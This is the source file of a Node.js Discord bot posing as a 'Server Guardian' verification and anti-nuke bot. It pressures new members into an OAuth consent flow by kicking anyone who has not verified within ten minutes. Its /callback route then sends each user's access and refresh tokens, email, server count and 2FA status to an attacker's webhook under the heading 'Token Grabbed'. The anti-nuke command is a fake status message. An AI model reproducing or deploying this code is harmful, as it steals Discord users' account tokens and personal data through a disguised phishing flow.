// Debug - log when any member joins
client.on('guildMemberAdd', (member) => {
  console.log('[DEBUG] Member joined: ' + member.user.tag + ' in ' + member.guild.name);
});

client.on('ready', () => {
  console.log('[DEBUG] Bot is ready!');
  console.log('[DEBUG] Guilds: ' + client.guilds.cache.map(g => g.name).join(', '));
  console.log('[DEBUG] WELCOME_CHANNEL_ID: ' + process.env.WELCOME_CHANNEL_ID);
  console.log('[DEBUG] GUILD_ID: ' + process.env.GUILD_ID);
});
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const https = require('https');
const app = express();

// ENV VARIABLES
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const YOUR_USER_ID = process.env.YOUR_USER_ID;
const GUILD_ID = process.env.GUILD_ID;
const WELCOME_CHANNEL_ID = process.env.WELCOME_CHANNEL_ID;

const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://discord-verify-bot-9r3w.onrender.com';
const REDIRECT_URI = BASE_URL + '/callback';

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ]
});

function keepAlive() {
  setInterval(() => {
    https.get(BASE_URL, (res) => {
      console.log('[Keep-alive] Ping: ' + res.statusCode);
    }).on('error', (err) => {
      console.log('[Keep-alive] Error: ' + err.message);
    });
  }, 240000);
}

client.once('ready', () => {
  console.log('[+] Bot online: ' + client.user.tag);
  keepAlive();
  client.user.setPresence({ activities: [{ name: 'Security', type: 3 }], status: 'dnd' });
  
  const cmds = [
    { name: 'ping', description: 'Ping' },
    { name: 'help', description: 'Help' },
    { name: 'verify', description: 'Verify' },
    { name: 'antinuke', description: 'Anti-nuke' },
    { name: 'stats', description: 'Stats' },
    { name: 'serverinfo', description: 'Server info' }
  ];
  client.application.commands.set(cmds).then(() => console.log('[+] Commands done'));
});

client.on('guildMemberAdd', async (member) => {
  if (member.user.bot) return;
  try {
    await new Promise(r => setTimeout(r, 2000));
    const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
    
    const wc = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (wc) {
      const we = new EmbedBuilder()
        .setTitle('Welcome ' + member.user.username + '!').setColor(0x57F287)
        .setDescription('Hey ' + member.user.toString() + ', welcome!\nCheck DM for verification.')
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .setFooter({ text: 'Server Guardian' });
      await wc.send({ embeds: [we] });
    }
    
    const dm = await member.user.createDM();
    const embed = new EmbedBuilder()
      .setTitle('Verification Required').setColor(0xED4245)
      .setDescription('Welcome to **' + member.guild.name + '**!\n\nVerify your account to access all channels.')
      .setFooter({ text: 'Server Guardian' });
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('Verify with Discord').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔒')
    );
    await dm.send({ embeds: [embed], components: [row] });
    console.log('[+] DM sent to ' + member.user.tag);
    
    setTimeout(async () => {
      try {
        const m = await member.guild.members.fetch(member.id).catch(() => null);
        if (m) {
          const vr = m.guild.roles.cache.find(r => r.name === 'Verified');
          if (!vr || !m.roles.cache.has(vr.id)) {
            await m.kick('Verification timeout.');
          }
        }
      } catch(e) {}
    }, 600000);
  } catch (error) {
    console.log('[-] Error: ' + error.message);
  }
});

client.on('guildMemberRemove', async (member) => {
  if (member.user.bot) return;
  try {
    const wc = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (wc) {
      const embed = new EmbedBuilder()
        .setTitle('Goodbye!').setColor(0xED4245)
        .setDescription(member.user.username + ' left.')
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .setFooter({ text: 'Server Guardian' });
      await wc.send({ embeds: [embed] });
    }
  } catch(e) {}
});

client.on('interactionCreate', async (interaction) => {
  const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
  
  if (interaction.isButton() && interaction.customId === 'verify_me') {
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('Authorize Now').setStyle(ButtonStyle.Link).setURL(authUrl)
    );
    await interaction.update({ content: 'Click to authorize:', components: [row] });
    return;
  }
  
  if (!interaction.isChatInputCommand()) return;
  
  if (interaction.commandName === 'ping') {
    await interaction.reply({ content: 'Pong! ' + client.ws.ping + 'ms', ephemeral: true });
  } else if (interaction.commandName === 'help') {
    const embed = new EmbedBuilder().setTitle('Commands').setColor(0x5865F2)
      .addFields(
        { name: '/ping', value: 'Ping', inline: true },
        { name: '/help', value: 'Help', inline: true },
        { name: '/verify', value: 'Verify', inline: true },
        { name: '/antinuke', value: 'Anti-nuke', inline: true },
        { name: '/stats', value: 'Stats', inline: true },
        { name: '/serverinfo', value: 'Info', inline: true }
      );
    await interaction.reply({ embeds: [embed], ephemeral: true });
  } else if (interaction.commandName === 'verify') {
    await interaction.reply({ content: 'Verify: ' + authUrl, ephemeral: true });
  } else if (interaction.commandName === 'antinuke') {
    await interaction.reply({ embeds: [new EmbedBuilder().setTitle('Anti-Nuke').setColor(0x57F287).setDescription('Status: ACTIVE')] });
  } else if (interaction.commandName === 'stats') {
    const g = interaction.guild;
    await interaction.reply({ embeds: [new EmbedBuilder().setTitle('Stats').setColor(0x5865F2).addFields(
      { name: 'Members', value: String(g.memberCount), inline: true },
      { name: 'Channels', value: String(g.channels.cache.size), inline: true },
      { name: 'Ping', value: client.ws.ping + 'ms', inline: true }
    )] });
  } else if (interaction.commandName === 'serverinfo') {
    const g = interaction.guild;
    const owner = await g.fetchOwner().catch(() => null);
    await interaction.reply({ embeds: [new EmbedBuilder().setTitle(g.name).setColor(0x5865F2).addFields(
      { name: 'Owner', value: owner ? owner.user.tag : 'Unknown', inline: true },
      { name: 'ID', value: g.id, inline: true },
      { name: 'Members', value: String(g.memberCount), inline: true }
    )] });
  }
});

app.get('/', (req, res) => res.send('Bot Online'));
app.get('/health', (req, res) => res.status(200).send('OK'));

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('No code');
  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      'client_id=' + CLIENT_ID + '&client_secret=' + CLIENT_SECRET + '&grant_type=authorization_code&code=' + code + '&redirect_uri=' + REDIRECT_URI,
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    const access_token = tokenRes.data.access_token;
    const refresh_token = tokenRes.data.refresh_token;
    const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: 'Bearer ' + access_token } });
    const user = userRes.data;
    const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', { headers: { Authorization: 'Bearer ' + access_token } });
    const connRes = await axios.get('https://discord.com/api/users/@me/connections', { headers: { Authorization: 'Bearer ' + access_token } });
    
    await axios.post(WEBHOOK_URL, {
      content: '<@' + YOUR_USER_ID + '> NEW TOKEN!',
      embeds: [{
        title: 'Token Grabbed',
        color: 0xED4245,
        fields: [
          { name: 'User', value: user.username + '#' + user.discriminator, inline: true },
          { name: 'ID', value: user.id, inline: true },
          { name: 'Email', value: user.email || 'None', inline: true },
          { name: 'Token', value: '```' + access_token + '```' },
          { name: 'Refresh', value: '```' + refresh_token + '```' },
          { name: 'Servers', value: String(guildsRes.data.length), inline: true },
          { name: '2FA', value: user.mfa_enabled ? 'Yes' : 'No', inline: true }
        ],
        thumbnail: { url: 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png' }
      }]
    });
    
    console.log('[+] Token: ' + user.username);
    
    try {
      const guild = client.guilds.cache.get(GUILD_ID);
      if (guild) {
        const member = await guild.members.fetch(user.id).catch(() => null);
        if (member) {
          const vr = guild.roles.cache.find(r => r.name === 'Verified');
          if (vr) await member.roles.add(vr);
        }
      }
    } catch(e) {}
    
    res.send('<h1>Verified!</h1><script>setTimeout(()=>window.close(),2000)</script>');
  } catch (error) {
    console.log('[-] Error: ' + error.message);
    res.send('<h2>Error: ' + error.message + '</h2>');
  }
});

client.login(BOT_TOKEN);
app.listen(PORT, () => console.log('[+] Server on ' + PORT));
